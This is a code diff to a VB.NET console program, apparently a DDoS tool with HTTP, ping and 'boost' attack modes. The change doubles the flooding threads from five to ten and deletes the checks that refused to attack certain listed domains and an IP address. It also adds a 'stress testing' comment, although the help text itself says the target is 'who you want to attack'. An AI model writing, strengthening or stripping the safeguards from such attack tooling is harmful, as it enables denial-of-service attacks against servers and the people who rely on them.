@@ -1,4 +1,5 @@
-﻿Imports System.IO
+﻿'Used of stress testing networks and servers
+Imports System.IO
 Imports System.Net
 Imports System.Text
 Imports System.Console
@@ -12,6 +13,11 @@ Public Class Ddos
     Dim t3 As Thread
     Dim t4 As Thread
     Dim t5 As Thread
+    Dim t6 As Thread
+    Dim t7 As Thread
+    Dim t8 As Thread
+    Dim t9 As Thread
+    Dim t10 As Thread
 
     '[Public Vars]
     Public REQ As Integer = 0
@@ -48,7 +54,7 @@ Public Class Ddos
         WriteLine("<type>      different kind of ddos attacks (make creates a boost file)")
         WriteLine("<target>    who you want to attack")
         WriteLine("<boostfile> a script for custom urls and User-Agents for http attack")
-        WriteLine("<wait>      used to make threads wait before connecting to the target again")
+        WriteLine("<wait>      used to make threads wait before connecting to the target again in mili")
         WriteLine("For more info on Ddos-ing see: ")
         WriteLine("http://en.wikipedia.org/wiki/Denial-of-service_attack")
         WriteLine("or type 'ddos?'")
@@ -95,16 +101,6 @@ Public Class Ddos
     End Sub
 
     Public Sub Start(ByVal Target As String, ByVal Type As String, Optional Power As Integer = 100)
-        If Target.Contains("quitetiny.com") = True Or Target.Contains("mailex.us") = True Then
-            WriteLine("No.")
-            Main()
-        ElseIf Target.Contains("hpregional.net") = True Or Target.Contains("108.162.29.53") = True Then
-            WriteLine("No.")
-            Main()
-        ElseIf Target.Contains("nursemckenny.com") = True Then
-            WriteLine("No.")
-            Main()
-        End If
         Attack_Target = Target
         Attack_Type = Type
         Interval = Power
@@ -137,16 +133,6 @@ a:
     End Sub
 
     Public Sub Boost_Start(ByVal Target As String, ByVal Boost As String, Optional Power As Integer = 1)
-        If Target.Contains("quitetiny.com") = True Or Target.Contains("mailex.us") = True Then
-            WriteLine("No.")
-            Main()
-        ElseIf Target.Contains("hpregional.net") = True Or Target.Contains("108.162.29.53") = True Then
-            WriteLine("No.")
-            Main()
-        ElseIf Target.Contains("nursemckenny.com") = True Then
-            WriteLine("No.")
-            Main()
-        End If
         Attack_Target = Target
         Booster = True
         Interval = Power
@@ -211,7 +197,7 @@ a:
         threadNum += 1
         WriteLine("DDOS Thread #" & threadNum & " stoped.")
         TRunning -= 1
-        If threadNum = 5 Then
+        If threadNum = 10 Then
             Write("Press any key to continue...")
         End If
     End Sub
@@ -230,7 +216,7 @@ a:
                 threadNum += 1
                 WriteLine("DDOS Thread #" & threadNum & " stoped.")
                 TRunning -= 1
-                If threadNum = 5 Then
+                If threadNum = 10 Then
                     Write("Press any key to continue...")
                 End If
                 Exit Sub
@@ -283,7 +269,7 @@ b:
         Attack_Threading()
     End Sub
 
-    Private Sub Boost_Attack()
+    Private Sub Boost_Attack() 'buggy
 
         threadNum = 0
         numm = 0
@@ -334,14 +320,24 @@ b:
             t3 = New Threading.Thread(AddressOf Http_Attack)
             t4 = New Threading.Thread(AddressOf Http_Attack)
             t5 = New Threading.Thread(AddressOf Http_Attack)
-            TRunning += 5
+            t6 = New Threading.Thread(AddressOf Http_Attack)
+            t7 = New Threading.Thread(AddressOf Http_Attack)
+            t8 = New Threading.Thread(AddressOf Http_Attack)
+            t9 = New Threading.Thread(AddressOf Http_Attack)
+            t10 = New Threading.Thread(AddressOf Http_Attack)
+            TRunning += 10
         ElseIf Attack_Type = "ping" Then
             t1 = New Threading.Thread(AddressOf Ping_Attack)
             t2 = New Threading.Thread(AddressOf Ping_Attack)
             t3 = New Threading.Thread(AddressOf Ping_Attack)
             t4 = New Threading.Thread(AddressOf Ping_Attack)
             t5 = New Threading.Thread(AddressOf Ping_Attack)
-            TRunning += 5
+            t6 = New Threading.Thread(AddressOf Ping_Attack)
+            t7 = New Threading.Thread(AddressOf Ping_Attack)
+            t8 = New Threading.Thread(AddressOf Ping_Attack)
+            t9 = New Threading.Thread(AddressOf Ping_Attack)
+            t10 = New Threading.Thread(AddressOf Ping_Attack)
+            TRunning += 10
         ElseIf Attack_Type = "Boost" Then
             ForegroundColor = ConsoleColor.Yellow
             WriteLine("Warning: Boost may slow down your computer until stopped.")
@@ -413,6 +409,11 @@ b:
         t3.Start()
         t4.Start()
         t5.Start()
+        t6.Start()
+        t7.Start()
+        t8.Start()
+        t9.Start()
+        t10.Start()
         WriteLine("Attack started.")
     End Sub
     Public Sub eStop()
@@ -424,7 +425,12 @@ b:
         t3.Abort()
         t4.Abort()
         t5.Abort()
-        TRunning -= 5
+        t6.Abort()
+        t7.Abort()
+        t8.Abort()
+        t9.Abort()
+        t10.Abort()
+        TRunning -= 10
     End Sub
     Private Function Ping_Server(ByVal Server As String)
         Try
